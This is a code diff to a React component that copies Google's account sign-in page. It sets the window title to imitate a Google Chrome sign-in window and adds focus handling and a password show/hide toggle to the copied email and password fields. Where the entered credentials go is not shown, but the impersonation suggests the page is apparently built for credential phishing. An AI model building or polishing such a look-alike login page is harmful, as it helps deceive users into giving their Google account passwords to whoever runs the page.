@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import axios from "axios";
 
 const GoogleAuthPage = () => {
@@ -9,6 +9,10 @@ const GoogleAuthPage = () => {
   const [passwordFocused, setPasswordFocused] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
 
+  // Add refs for input fields
+  const emailInputRef = useRef(null);
+  const passwordInputRef = useRef(null);
+
   // Update the window title to match Google's sign-in page
   useEffect(() => {
     document.title = "Sign in - Google Accounts - Google Chrome";
@@ -18,6 +22,12 @@ const GoogleAuthPage = () => {
     e.preventDefault();
     if (email.trim()) {
       setShowPasswordScreen(true);
+      // Focus password input after transition
+      setTimeout(() => {
+        if (passwordInputRef.current) {
+          passwordInputRef.current.focus();
+        }
+      }, 100);
     }
   };
 
@@ -54,7 +64,18 @@ const GoogleAuthPage = () => {
     }
   };
 
-  // Rest of the component remains the same...
+  // Function to handle clicking on the input container
+  const focusEmailInput = () => {
+    if (emailInputRef.current) {
+      emailInputRef.current.focus();
+    }
+  };
+
+  const focusPasswordInput = () => {
+    if (passwordInputRef.current) {
+      passwordInputRef.current.focus();
+    }
+  };
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
@@ -102,8 +123,15 @@ const GoogleAuthPage = () => {
               {/* Email input with floating label */}
               <div className="mb-7">
                 <div className="relative">
+                  {/* Make the entire input container clickable */}
                   <div
-                    className={`absolute transition-all duration-300 ${
+                    className="absolute inset-0 cursor-text z-10"
+                    onClick={focusEmailInput}
+                  ></div>
+
+                  {/* Make the label text non-selectable and non-interactive */}
+                  <div
+                    className={`absolute transition-all duration-300 select-none pointer-events-none z-20 ${
                       emailFocused || email
                         ? "top-[-8px] left-3 text-xs bg-white px-1 text-blue-600"
                         : "top-[14px] left-3 text-gray-500"
@@ -111,13 +139,15 @@ const GoogleAuthPage = () => {
                   >
                     Email or phone
                   </div>
+
                   <input
+                    ref={emailInputRef}
                     type="text"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
                     onFocus={() => setEmailFocused(true)}
                     onBlur={() => setEmailFocused(false)}
-                    className="w-full px-3 py-3 border border-gray-300 rounded text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                    className="w-full px-3 py-3 border border-gray-300 rounded text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 relative z-10"
                     required
                   />
                 </div>
@@ -200,8 +230,15 @@ const GoogleAuthPage = () => {
               {/* Password input field with floating label */}
               <div className="mb-8">
                 <div className="relative">
+                  {/* Make the entire input container clickable */}
                   <div
-                    className={`absolute transition-all duration-300 ${
+                    className="absolute inset-0 cursor-text z-10"
+                    onClick={focusPasswordInput}
+                  ></div>
+
+                  {/* Make the label text non-selectable and non-interactive */}
+                  <div
+                    className={`absolute transition-all duration-300 select-none pointer-events-none z-20 ${
                       passwordFocused || password
                         ? "top-[-8px] left-3 text-xs bg-white px-1 text-blue-600"
                         : "top-[14px] left-3 text-gray-500"
@@ -209,15 +246,25 @@ const GoogleAuthPage = () => {
                   >
                     Enter your password
                   </div>
+
                   <input
+                    ref={passwordInputRef}
                     type={showPassword ? "text" : "password"}
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     onFocus={() => setPasswordFocused(true)}
                     onBlur={() => setPasswordFocused(false)}
-                    className="w-full px-3 py-3 border border-gray-300 rounded text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                    className="w-full px-3 py-3 border border-gray-300 rounded text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 pr-16 relative z-10"
                     required
                   />
+
+                  <button
+                    type="button"
+                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-blue-600 font-medium z-20"
+                    onClick={() => setShowPassword(!showPassword)}
+                  >
+                    {showPassword ? "Hide" : "Show"}
+                  </button>
                 </div>
 
                 {/* Show password checkbox */}
